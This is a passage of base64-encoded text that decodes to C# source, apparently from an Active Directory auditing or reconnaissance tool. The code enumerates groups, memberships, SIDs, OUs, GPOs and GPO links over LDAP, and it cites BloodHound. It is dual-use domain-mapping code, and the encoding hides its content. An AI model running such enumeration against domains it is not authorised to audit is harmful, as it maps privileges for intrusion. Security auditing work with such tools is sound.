G5ldyBQU05vdGVQcm9wZXJ0eSgiU0lESGlzdG9yeSIsIFNJREhpc3RvcnkpKTsKICAgICAgICAgICAgICAgICAgICBHcm91cE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlc2NyaXB0aW9uIiwgKEFkR3JvdXAuUHJvcGVydGllc1siRGVzY3JpcHRpb24iXS5Db3VudCAhPSAwID8gQ2xlYW5TdHJpbmcoQWRHcm91cC5Qcm9wZXJ0aWVzWyJEZXNjcmlwdGlvbiJdWzBdKSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIEdyb3VwT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgid2hlbkNyZWF0ZWQiLCBBZEdyb3VwLlByb3BlcnRpZXNbIndoZW5jcmVhdGVkIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICBHcm91cE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIndoZW5DaGFuZ2VkIiwgQWRHcm91cC5Qcm9wZXJ0aWVzWyJ3aGVuY2hhbmdlZCJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgR3JvdXBPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEaXN0aW5ndWlzaGVkTmFtZSIsIENsZWFuU3RyaW5nKEFkR3JvdXAuUHJvcGVydGllc1siZGlzdGluZ3Vpc2hlZG5hbWUiXVswXSkpKTsKICAgICAgICAgICAgICAgICAgICBHcm91cE9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkNhbm9uaWNhbE5hbWUiLCBBZEdyb3VwLlByb3BlcnRpZXNbImNhbm9uaWNhbG5hbWUiXVswXSkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IEdyb3VwT2JqIH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGNsYXNzIEdyb3VwUmVjb3JkRGljdGlvbmFyeVByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkR3JvdXAgPSAoU2VhcmNoUmVzdWx0KSByZWNvcmQ7CiAgICAgICAgICAgICAgICAgICAgTERBUENsYXNzLkFkR3JvdXBEaWN0aW9uYXJ5LkFkZCgoQ29udmVydC5Ub1N0cmluZyhuZXcgU2VjdXJpdHlJZGVudGlmaWVyKChieXRlW10pQWRHcm91cC5Qcm9wZXJ0aWVzWyJvYmplY3RTSUQiXVswXSwgMCkpKSwoQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLlByb3BlcnRpZXNbInNhbWFjY291bnRuYW1lIl1bMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgfTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgY2xhc3MgR3JvdXBNZW1iZXJSZWNvcmRQcm9jZXNzb3IgOiBJUmVjb3JkUHJvY2Vzc29yCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgUFNPYmplY3RbXSBwcm9jZXNzUmVjb3JkKE9iamVjdCByZWNvcmQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIC8vIGh0dHBzOi8vZ2l0aHViLmNvbS9CbG9vZEhvdW5kQUQvQmxvb2RIb3VuZC9ibG9iL21hc3Rlci9Qb3dlclNoZWxsL0Jsb29kSG91bmQucHMxCiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkR3JvdXAgPSAoU2VhcmNoUmVzdWx0KSByZWNvcmQ7CiAgICAgICAgICAgICAgICAgICAgTGlzdDxQU09iamVjdD4gR3JvdXBzTGlzdCA9IG5ldyBMaXN0PFBTT2JqZWN0PigpOwogICAgICAgICAgICAgICAgICAgIHN0cmluZyBTYW1BY2NvdW50VHlwZSA9IEFkR3JvdXAuUHJvcGVydGllc1sic2FtYWNjb3VudHR5cGUiXS5Db3VudCAhPSAwID8gQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLlByb3BlcnRpZXNbInNhbWFjY291bnR0eXBlIl1bMF0pIDogIiI7CiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIEFjY291bnRUeXBlID0gIiI7CiAgICAgICAgICAgICAgICAgICAgc3RyaW5nIEdyb3VwTmFtZSA9ICIiOwogICAgICAgICAgICAgICAgICAgIHN0cmluZyBNZW1iZXJVc2VyTmFtZSA9ICItIjsKICAgICAgICAgICAgICAgICAgICBzdHJpbmcgTWVtYmVyTmFtZSA9ICIiOwoKICAgICAgICAgICAgICAgICAgICBpZiAoR3JvdXBzLkNvbnRhaW5zKFNhbUFjY291bnRUeXBlKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIEFjY291bnRUeXBlID0gImdyb3VwIjsKICAgICAgICAgICAgICAgICAgICAgICAgTWVtYmVyTmFtZSA9ICgoQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLlByb3BlcnRpZXNbIkRpc3Rpbmd1aXNoZWROYW1lIl1bMF0pKS5TcGxpdCgnLCcpWzBdKS5TcGxpdCgnPScpWzFdOwogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChTdHJpbmcgR3JvdXBNZW1iZXIgaW4gQWRHcm91cC5Qcm9wZXJ0aWVzWyJtZW1iZXJvZiJdKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE5hbWUgPSAoKENvbnZlcnQuVG9TdHJpbmcoR3JvdXBNZW1iZXIpKS5TcGxpdCgnLCcpWzBdKS5TcGxpdCgnPScpWzFdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgR3JvdXBNZW1iZXJPYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiR3JvdXAgTmFtZSIsIEdyb3VwTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgVXNlck5hbWUiLCBNZW1iZXJVc2VyTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgTmFtZSIsIE1lbWJlck5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjb3VudFR5cGUiLCBBY2NvdW50VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBzTGlzdC5BZGQoIEdyb3VwTWVtYmVyT2JqICk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKFVzZXJzLkNvbnRhaW5zKFNhbUFjY291bnRUeXBlKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIEFjY291bnRUeXBlID0gInVzZXIiOwogICAgICAgICAgICAgICAgICAgICAgICBNZW1iZXJOYW1lID0gKChDb252ZXJ0LlRvU3RyaW5nKEFkR3JvdXAuUHJvcGVydGllc1siRGlzdGluZ3Vpc2hlZE5hbWUiXVswXSkpLlNwbGl0KCcsJylbMF0pLlNwbGl0KCc9JylbMV07CiAgICAgICAgICAgICAgICAgICAgICAgIE1lbWJlclVzZXJOYW1lID0gQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLlByb3BlcnRpZXNbInNBTUFjY291bnROYW1lIl1bMF0pOwogICAgICAgICAgICAgICAgICAgICAgICBTdHJpbmcgUHJpbWFyeUdyb3VwSUQgPSBDb252ZXJ0LlRvU3RyaW5nKEFkR3JvdXAuUHJvcGVydGllc1sicHJpbWFyeUdyb3VwSUQiXVswXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE5hbWUgPSBMREFQQ2xhc3MuQWRHcm91cERpY3Rpb25hcnlbTERBUENsYXNzLkRvbWFpblNJRCArICItIiArIFByaW1hcnlHcm91cElEXTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCAvLyhFeGNlcHRpb24gZSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9Db25zb2xlLldyaXRlTGluZSgiezB9IEV4Y2VwdGlvbiBjYXVnaHQuIiwgZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE5hbWUgPSBQcmltYXJ5R3JvdXBJRDsKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgR3JvdXBNZW1iZXJPYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiR3JvdXAgTmFtZSIsIEdyb3VwTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgVXNlck5hbWUiLCBNZW1iZXJVc2VyTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgTmFtZSIsIE1lbWJlck5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjb3VudFR5cGUiLCBBY2NvdW50VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBzTGlzdC5BZGQoIEdyb3VwTWVtYmVyT2JqICk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKFN0cmluZyBHcm91cE1lbWJlciBpbiBBZEdyb3VwLlByb3BlcnRpZXNbIm1lbWJlcm9mIl0pCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTmFtZSA9ICgoQ29udmVydC5Ub1N0cmluZyhHcm91cE1lbWJlcikpLlNwbGl0KCcsJylbMF0pLlNwbGl0KCc9JylbMV07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBHcm91cE1lbWJlck9iaiA9IG5ldyBQU09iamVjdCgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJHcm91cCBOYW1lIiwgR3JvdXBOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk1lbWJlciBVc2VyTmFtZSIsIE1lbWJlclVzZXJOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIk1lbWJlciBOYW1lIiwgTWVtYmVyTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJBY2NvdW50VHlwZSIsIEFjY291bnRUeXBlKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cHNMaXN0LkFkZCggR3JvdXBNZW1iZXJPYmogKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBpZiAoQ29tcHV0ZXJzLkNvbnRhaW5zKFNhbUFjY291bnRUeXBlKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIEFjY291bnRUeXBlID0gImNvbXB1dGVyIjsKICAgICAgICAgICAgICAgICAgICAgICAgTWVtYmVyTmFtZSA9ICgoQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLlByb3BlcnRpZXNbIkRpc3Rpbmd1aXNoZWROYW1lIl1bMF0pKS5TcGxpdCgnLCcpWzBdKS5TcGxpdCgnPScpWzFdOwogICAgICAgICAgICAgICAgICAgICAgICBNZW1iZXJVc2VyTmFtZSA9IENvbnZlcnQuVG9TdHJpbmcoQWRHcm91cC5Qcm9wZXJ0aWVzWyJzQU1BY2NvdW50TmFtZSJdWzBdKTsKICAgICAgICAgICAgICAgICAgICAgICAgU3RyaW5nIFByaW1hcnlHcm91cElEID0gQ29udmVydC5Ub1N0cmluZyhBZEdyb3VwLlByb3BlcnRpZXNbInByaW1hcnlHcm91cElEIl1bMF0pOwogICAgICAgICAgICAgICAgICAgICAgICB0cnkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBOYW1lID0gTERBUENsYXNzLkFkR3JvdXBEaWN0aW9uYXJ5W0xEQVBDbGFzcy5Eb21haW5TSUQgKyAiLSIgKyBQcmltYXJ5R3JvdXBJRF07CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2ggLy8oRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBOYW1lID0gUHJpbWFyeUdyb3VwSUQ7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IEdyb3VwTWVtYmVyT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkdyb3VwIE5hbWUiLCBHcm91cE5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWVtYmVyIFVzZXJOYW1lIiwgTWVtYmVyVXNlck5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiTWVtYmVyIE5hbWUiLCBNZW1iZXJOYW1lKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE1lbWJlck9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkFjY291bnRUeXBlIiwgQWNjb3VudFR5cGUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3Vwc0xpc3QuQWRkKCBHcm91cE1lbWJlck9iaiApOwogICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICBmb3JlYWNoIChTdHJpbmcgR3JvdXBNZW1iZXIgaW4gQWRHcm91cC5Qcm9wZXJ0aWVzWyJtZW1iZXJvZiJdKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBHcm91cE5hbWUgPSAoKENvbnZlcnQuVG9TdHJpbmcoR3JvdXBNZW1iZXIpKS5TcGxpdCgnLCcpWzBdKS5TcGxpdCgnPScpWzFdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUFNPYmplY3QgR3JvdXBNZW1iZXJPYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiR3JvdXAgTmFtZSIsIEdyb3VwTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgVXNlck5hbWUiLCBNZW1iZXJVc2VyTmFtZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBNZW1iZXJPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJNZW1iZXIgTmFtZSIsIE1lbWJlck5hbWUpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEdyb3VwTWVtYmVyT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiQWNjb3VudFR5cGUiLCBBY2NvdW50VHlwZSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgR3JvdXBzTGlzdC5BZGQoIEdyb3VwTWVtYmVyT2JqICk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgaWYgKFRydXN0QWNjb3VudHMuQ29udGFpbnMoU2FtQWNjb3VudFR5cGUpKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgLy8gVE8gRE8KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIEdyb3Vwc0xpc3QuVG9BcnJheSgpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggKEV4Y2VwdGlvbiBlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJ7MH0gRXhjZXB0aW9uIGNhdWdodC4iLCBlKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm4gbmV3IFBTT2JqZWN0W10geyB9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICBjbGFzcyBPVVJlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkT1UgPSAoU2VhcmNoUmVzdWx0KSByZWNvcmQ7CgogICAgICAgICAgICAgICAgICAgIFBTT2JqZWN0IE9VT2JqID0gbmV3IFBTT2JqZWN0KCk7CiAgICAgICAgICAgICAgICAgICAgT1VPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJOYW1lIiwgQWRPVS5Qcm9wZXJ0aWVzWyJuYW1lIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICBPVU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIkRlcHRoIiwgKChDb252ZXJ0LlRvU3RyaW5nKEFkT1UuUHJvcGVydGllc1siZGlzdGluZ3Vpc2hlZG5hbWUiXVswXSkuU3BsaXQobmV3IHN0cmluZ1tdIHsgIk9VPSIgfSwgU3RyaW5nU3BsaXRPcHRpb25zLk5vbmUpKS5MZW5ndGggLTEpKSk7CiAgICAgICAgICAgICAgICAgICAgT1VPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEZXNjcmlwdGlvbiIsIChBZE9VLlByb3BlcnRpZXNbImRlc2NyaXB0aW9uIl0uQ291bnQgIT0gMCA/IEFkT1UuUHJvcGVydGllc1siZGVzY3JpcHRpb24iXVswXSA6ICIiKSkpOwogICAgICAgICAgICAgICAgICAgIE9VT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgid2hlbkNyZWF0ZWQiLCBBZE9VLlByb3BlcnRpZXNbIndoZW5jcmVhdGVkIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICBPVU9iai5NZW1iZXJzLkFkZChuZXcgUFNOb3RlUHJvcGVydHkoIndoZW5DaGFuZ2VkIiwgQWRPVS5Qcm9wZXJ0aWVzWyJ3aGVuY2hhbmdlZCJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgT1VPYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEaXN0aW5ndWlzaGVkTmFtZSIsIEFkT1UuUHJvcGVydGllc1siZGlzdGluZ3Vpc2hlZG5hbWUiXVswXSkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IE9VT2JqIH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGNsYXNzIEdQT1JlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkR1BPID0gKFNlYXJjaFJlc3VsdCkgcmVjb3JkOwoKICAgICAgICAgICAgICAgICAgICBQU09iamVjdCBHUE9PYmogPSBuZXcgUFNPYmplY3QoKTsKICAgICAgICAgICAgICAgICAgICBHUE9PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEaXNwbGF5TmFtZSIsIENsZWFuU3RyaW5nKEFkR1BPLlByb3BlcnRpZXNbImRpc3BsYXluYW1lIl1bMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgR1BPT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiR1VJRCIsIENsZWFuU3RyaW5nKEFkR1BPLlByb3BlcnRpZXNbIm5hbWUiXVswXSkpKTsKICAgICAgICAgICAgICAgICAgICBHUE9PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJ3aGVuQ3JlYXRlZCIsIEFkR1BPLlByb3BlcnRpZXNbIndoZW5DcmVhdGVkIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICBHUE9PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJ3aGVuQ2hhbmdlZCIsIEFkR1BPLlByb3BlcnRpZXNbIndoZW5DaGFuZ2VkIl1bMF0pKTsKICAgICAgICAgICAgICAgICAgICBHUE9PYmouTWVtYmVycy5BZGQobmV3IFBTTm90ZVByb3BlcnR5KCJEaXN0aW5ndWlzaGVkTmFtZSIsIENsZWFuU3RyaW5nKEFkR1BPLlByb3BlcnRpZXNbImRpc3Rpbmd1aXNoZWRuYW1lIl1bMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgR1BPT2JqLk1lbWJlcnMuQWRkKG5ldyBQU05vdGVQcm9wZXJ0eSgiRmlsZVBhdGgiLCBBZEdQTy5Qcm9wZXJ0aWVzWyJncGNmaWxlc3lzcGF0aCJdWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBQU09iamVjdFtdIHsgR1BPT2JqIH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGNsYXNzIEdQT1JlY29yZERpY3Rpb25hcnlQcm9jZXNzb3IgOiBJUmVjb3JkUHJvY2Vzc29yCiAgICAgICAgewogICAgICAgICAgICBwdWJsaWMgUFNPYmplY3RbXSBwcm9jZXNzUmVjb3JkKE9iamVjdCByZWNvcmQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFNlYXJjaFJlc3VsdCBBZEdQTyA9IChTZWFyY2hSZXN1bHQpIHJlY29yZDsKICAgICAgICAgICAgICAgICAgICBMREFQQ2xhc3MuQWRHUE9EaWN0aW9uYXJ5LkFkZCgoQ29udmVydC5Ub1N0cmluZyhBZEdQTy5Qcm9wZXJ0aWVzWyJkaXN0aW5ndWlzaGVkbmFtZSJdWzBdKS5Ub1VwcGVyKCkpLCAoQ29udmVydC5Ub1N0cmluZyhBZEdQTy5Qcm9wZXJ0aWVzWyJkaXNwbGF5bmFtZSJdWzBdKSkpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoInswfSBFeGNlcHRpb24gY2F1Z2h0LiIsIGUpOwogICAgICAgICAgICAgICAgICAgIHJldHVybiBuZXcgUFNPYmplY3RbXSB7IH07CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGNsYXNzIFNPTVJlY29yZFByb2Nlc3NvciA6IElSZWNvcmRQcm9jZXNzb3IKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBQU09iamVjdFtdIHByb2Nlc3NSZWNvcmQoT2JqZWN0IHJlY29yZCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU2VhcmNoUmVzdWx0IEFkU09NID0gKFNlYXJjaFJlc3VsdCkgcmVjb3JkOwoKICAgICAgICAgICAgICAgICAgICBMaXN0PFBTT2JqZWN0PiBTT01zTGlzdCA9IG5ldyBMaXN0PFBTT2JqZWN0PigpOwogICAgICAgICAgICAgICAgICAgIGludCBEZXB0aCA9IDA7CiAgICAgICAgICAgICAgICAgICAgYm9vbCBCbG9ja0luaGVyaXRhbmNlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgYm9vbD8gTGlua0VuYWJsZWQgPSBudWxsOwogICAgICAgICAgICAgICAgICAgIGJvb2w/IEVuZm9yY2VkID0gbnVsbDsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgZ1BMaW5rID0gKEFkU09NLlByb3BlcnRpZXNbImdQTGluayJdLkNvdW50ICE9IDAgPyBDb252ZXJ0LlRvU3RyaW5nKEFkU09NLlByb3BlcnRpZXNbImdQTGluayJdWzBdKSA6ICIiKTsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgR1BPTmFtZSA9IG51bGw7CgogICAgICAgICAgICAgICAgICAgIERlcHRoID0gKChDb252ZXJ0LlRvU3RyaW5nKEFkU09NLlByb3BlcnRp